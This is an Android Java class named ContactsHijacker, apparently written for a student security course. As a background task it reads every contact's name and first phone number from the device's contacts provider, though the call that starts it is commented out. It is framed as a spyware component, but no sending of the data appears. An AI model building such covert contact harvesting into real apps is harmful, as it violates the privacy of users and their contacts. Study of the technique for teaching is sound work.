package com.seginfo.tp.seginfotp;

/**
 * Created by juan on 27/06/15.
 */
import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import java.util.ArrayList;

public class ContactsHijacker extends AsyncTask<Activity, Void, String> {

    Activity _act;

    @Override
    protected String doInBackground(Activity... args) {
        _act = args[0];
        //obtener_contactos();
        return "OK";
    }

    public ArrayList<Contact> obtener_contactos() {
        ContentResolver cr = _act.getContentResolver();
        ArrayList<Contact> listaDeContactos = new ArrayList<Contact>();
        String[] select =
            { ///DATOS DEL CONTACTO A SOLICITAR (select _ID, DISPLAY_NAME from  ....)
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME
            };
        Cursor mCursor = cr.query(
                ContactsContract.Contacts.CONTENT_URI, select,
                null, null, null);
        while (mCursor.moveToNext()) {
            String idContacto = mCursor.getString(
                    mCursor.getColumnIndex(ContactsContract.Contacts._ID));
            String nombre = mCursor.getString(
                    mCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            String telefonosDelContacto = "";
            Cursor phones = cr.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + idContacto,
                    null, null);
            if (phones.moveToNext()) {
                String tel = phones.getString(
                        phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                telefonosDelContacto += tel;
            }
            if (telefonosDelContacto != "") {
                listaDeContactos.add(
                        new Contact(Integer.parseInt(idContacto), nombre, telefonosDelContacto));
            }
            phones.close();
        }
        mCursor.close();
        return listaDeContactos;
    }
}

